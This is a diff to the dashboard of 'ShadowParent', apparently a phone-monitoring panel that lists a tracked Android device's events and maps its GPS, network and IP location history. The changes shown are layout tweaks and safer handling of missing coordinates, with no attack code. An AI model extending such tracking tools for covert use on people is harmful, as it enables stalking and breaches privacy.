@@ -2,6 +2,7 @@
 <html lang="sk"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title>ShadowParent · Dashboard</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%234f7cff' d='M12 2 4 6v6c0 5 3.4 9.4 8 10 4.6-.6 8-5 8-10V6z'/%3E%3C/svg%3E">
 <link rel="stylesheet" href="/static/leaflet/leaflet.css">
 <style>
 :root{
@@ -123,6 +124,7 @@ button,input,select,textarea{font-family:inherit}
 .tiles{grid-template-columns:repeat(auto-fit,minmax(190px,1fr));margin-bottom:16px}
 .tile{padding:16px 17px;position:relative;overflow:hidden}
 .tile .k{font-size:11px;letter-spacing:.13em;text-transform:uppercase;color:var(--dim);display:flex;align-items:center;gap:7px}
+.tile .k svg{width:16px;height:16px;flex:none;opacity:.75}
 .tile .v{font-size:27px;font-weight:700;margin:9px 0 2px;letter-spacing:-.6px}
 .tile .s{font-size:12px;color:var(--mut)}
 .tile .spark{position:absolute;right:-6px;bottom:-10px;opacity:.16}
@@ -251,6 +253,15 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
 .chipgrp{font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim);margin:14px 0 8px}
 .chipgrp:first-child{margin-top:0}
 
+/* Touch devices: keep every tappable control at a finger-friendly size. */
+@media(pointer:coarse){
+  .nav a{min-height:44px}
+  .btn{min-height:44px;padding:10px 14px}
+  .top .btn,.hamb{min-width:44px;min-height:44px;justify-content:center}
+  .chip{min-height:44px;padding:10px 16px}
+  .cmdrow input,.cmdrow select{min-height:44px}
+  .gitem .nm a{display:inline-block;padding:8px 2px}
+}
 @media(max-width:920px){
   .app{grid-template-columns:1fr}
   .side{position:fixed;z-index:60;width:266px;transform:translateX(-100%);transition:.22s}
@@ -258,6 +269,13 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
   .hamb{display:inline-flex}
   .search{display:none}
   .wrap{padding:16px 13px 34px}
+  /* Two compact columns instead of one huge tile per row. */
+  .tiles{grid-template-columns:repeat(2,minmax(0,1fr));gap:10px}
+  .tiles .tile{padding:11px 12px}
+  .tiles .tile .k{font-size:9.5px;letter-spacing:.1em;gap:5px}
+  .tiles .tile .k svg{width:14px;height:14px}
+  .tiles .tile .v{font-size:19px;margin:5px 0 1px}
+  .tiles .tile .s{font-size:11px;line-height:1.35}
   /* The header wraps: buttons on the first row, the device name on its own
      row - otherwise the name overlaps the buttons on a phone. */
   .top{flex-wrap:wrap;row-gap:9px;padding:10px 12px}
@@ -507,6 +525,12 @@ const fmtAgo = ts => { if(!ts) return 'nikdy'; const s=Math.floor((Date.now()-ts
   if(s<60) return 'pred '+s+' s'; if(s<3600) return 'pred '+Math.floor(s/60)+' min';
   if(s<86400) return 'pred '+Math.floor(s/3600)+' h'; return 'pred '+Math.floor(s/86400)+' d'; };
 const j = async u => { const r = await fetch(u,{cache:'no-store'}); if(!r.ok) return null; return r.json(); };
+/* Coordinates arrive as numbers, strings or not at all - toFixed() on a missing
+   value used to throw and break the whole render. */
+const num = (v,d=5) => (typeof v==='number' && isFinite(v)) ? v.toFixed(d)
+                       : (v==null || v==='' ? '—' : String(v));
+const hasCoords = o => !!o && o.lat!=null && o.lon!=null
+                  && isFinite(Number(o.lat)) && isFinite(Number(o.lon));
 const qs = o => Object.entries(o).filter(([,v])=>v!==''&&v!=null).map(([k,v])=>k+'='+encodeURIComponent(v)).join('&');
 
 const ICONS = {
@@ -592,7 +616,8 @@ async function loadOverview(){
   const online = d.online;
   $('avatar').textContent = (dev.model||'?').slice(0,2).toUpperCase();
   $('devName').textContent = dev.model || S.device;
-  $('devSub').textContent = `${S.device} · ${meta.release?('Android '+meta.release):'Android ?'} · videli pred ${fmtAgo(dev.last_seen)}`;
+  const androidVer = meta.release ? 'Android '+meta.release : (meta.sdk ? 'Android SDK '+meta.sdk : 'Android');
+  $('devSub').textContent = `${S.device} · ${androidVer} · ${fmtAgo(dev.last_seen)}`;
   const del=$('delBtn');
   if(del){ del.style.display='inline-flex'; del.onclick=deleteDevice; }
   const wiz=$('wizBtn');
@@ -622,9 +647,9 @@ async function loadOverview(){
     <div class="card tile" data-go="commands"><div class="k">${icon('default')} Udalosti</div>
       <div class="v">${total}</div><div class="s">celkovo uložených</div></div>
     <div class="card tile" data-go="location"><div class="k">${icon('location')} Posledná poloha</div>
-      <div class="v" style="font-size:17px">${loc.lat?loc.lat.toFixed(4)+', '+loc.lon.toFixed(4):'—'}</div>
+      <div class="v" style="font-size:17px">${hasCoords(loc)?num(loc.lat,4)+', '+num(loc.lon,4):'—'}</div>
       <div class="s">${loc.ts?fmtAgo(loc.ts)+' · '+srcTag(loc.source):'zatiaľ bez fixu'}</div>
-      ${web.loc?`<div class="s">IP: ${web.loc.lat.toFixed(4)}, ${web.loc.lon.toFixed(4)} · ${fmtAgo(web.loc.ts)} ${srcTag('web')}</div>`:''}
+      ${hasCoords(web.loc)?`<div class="s">IP: ${num(web.loc.lat,4)}, ${num(web.loc.lon,4)} · ${fmtAgo(web.loc.ts)} ${srcTag('web')}</div>`:''}
       </div>`;
   $('tiles').querySelectorAll('.tile').forEach(t=>t.addEventListener('click',()=>go(t.dataset.go)));
 
@@ -676,7 +701,7 @@ async function loadLocation(){
   $('locHint').textContent = track.length+' fixov';
   $('locRows').innerHTML = track.length ? track.map(t=>`<tr>
       <td class="mono">${fmtT(t.ts)}</td>
-      <td class="mono">${(t.lat??'').toFixed?.(5)??t.lat}, ${(t.lon??'').toFixed?.(5)??t.lon}</td>
+      <td class="mono">${num(t.lat,5)}, ${num(t.lon,5)}</td>
       <td>${t.accuracy!=null?Math.round(t.accuracy)+' m':'—'}</td>
       <td>${srcTag(t.source||t.provider||'—')}</td></tr>`).join('')
     : '<tr><td colspan="4" class="empty">Zatiaľ žiadne polohy. Pošli príkaz <b>loc</b>.</td></tr>';
@@ -718,36 +743,38 @@ function drawMap(track){
   if(S.mapLayer){ S.mapLayer.remove(); S.mapLayer=null; }
   if(S.marks){ S.marks.forEach(m=>m.remove()); S.marks=[]; }
   if(!track || !track.length){ return; }
-  const pts = track.slice().reverse().map(t=>[t.lat,t.lon]);
+  const fixes = track.filter(t=>hasCoords(t));
+  if(!fixes.length) return;
+  const pts = fixes.slice().reverse().map(t=>[Number(t.lat),Number(t.lon)]);
   if(pts.length>1){
     S.track=L.polyline(pts,{color:'#4f7cff',weight:3,opacity:.9}).addTo(S.map);
   }
   // Every fix is drawn with the colour of its source: green = GPS,
   // cyan = network, orange = IP geolocation.
-  S.marks = track.slice(0,60).map(t=>{
+  S.marks = fixes.slice(0,60).map(t=>{
     const src=(t.source||'gps').toLowerCase();
     const col=SRC_COLOR[src]||'#4f7cff';
-    return L.circleMarker([t.lat,t.lon],{radius:7,color:'#fff',weight:2,fillColor:col,fillOpacity:1})
+    return L.circleMarker([Number(t.lat),Number(t.lon)],{radius:7,color:'#fff',weight:2,fillColor:col,fillOpacity:1})
       .addTo(S.map)
-      .bindPopup(`<b>${esc(S.device)}</b><br>${t.lat.toFixed(5)}, ${t.lon.toFixed(5)}<br>`+
+      .bindPopup(`<b>${esc(S.device)}</b><br>${num(t.lat,5)}, ${num(t.lon,5)}<br>`+
                  `${fmtT(t.ts)} · ${esc(SRC_LABEL[src]||src)} · `+
                  `${t.accuracy!=null?Math.round(t.accuracy)+' m':'—'}`);
   });
-  const last=track[0];
+  const last=fixes[0];
   const lastCol=SRC_COLOR[(last.source||'gps').toLowerCase()]||'#4f7cff';
-  S.mapLayer=L.circleMarker([last.lat,last.lon],{radius:11,color:'#fff',weight:3,fillColor:lastCol,fillOpacity:1})
-    .addTo(S.map).bindPopup(`<b>${esc(S.device)}</b><br>${last.lat.toFixed(5)}, ${last.lon.toFixed(5)}<br>${fmtT(last.ts)}`);
-  S.map.setView([last.lat,last.lon],14);
+  S.mapLayer=L.circleMarker([Number(last.lat),Number(last.lon)],{radius:11,color:'#fff',weight:3,fillColor:lastCol,fillOpacity:1})
+    .addTo(S.map).bindPopup(`<b>${esc(S.device)}</b><br>${num(last.lat,5)}, ${num(last.lon,5)}<br>${fmtT(last.ts)}`);
+  S.map.setView([Number(last.lat),Number(last.lon)],14);
   setTimeout(()=>S.map.invalidateSize(),60);
 }
 function drawMini(loc){
   if(!S.mini){ S.mini=baseMap($('mapMini')); S.miniMini=false; }
   if(S.miniMark){ S.miniMark.remove(); S.miniMark=null; }
-  if(!loc || !loc.lat) return;
+  if(!hasCoords(loc)) return;
   const col=SRC_COLOR[(loc.source||'gps').toLowerCase()]||'#22c55e';
-  S.miniMark=L.circleMarker([loc.lat,loc.lon],{radius:7,color:'#fff',weight:2,fillColor:col,fillOpacity:1})
-    .addTo(S.mini).bindPopup(`${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)}`);
-  S.mini.setView([loc.lat,loc.lon],12);
+  S.miniMark=L.circleMarker([Number(loc.lat),Number(loc.lon)],{radius:7,color:'#fff',weight:2,fillColor:col,fillOpacity:1})
+    .addTo(S.mini).bindPopup(`${num(loc.lat,5)}, ${num(loc.lon,5)}`);
+  S.mini.setView([Number(loc.lat),Number(loc.lon)],12);
   setTimeout(()=>S.mini.invalidateSize(),60);
 }
 
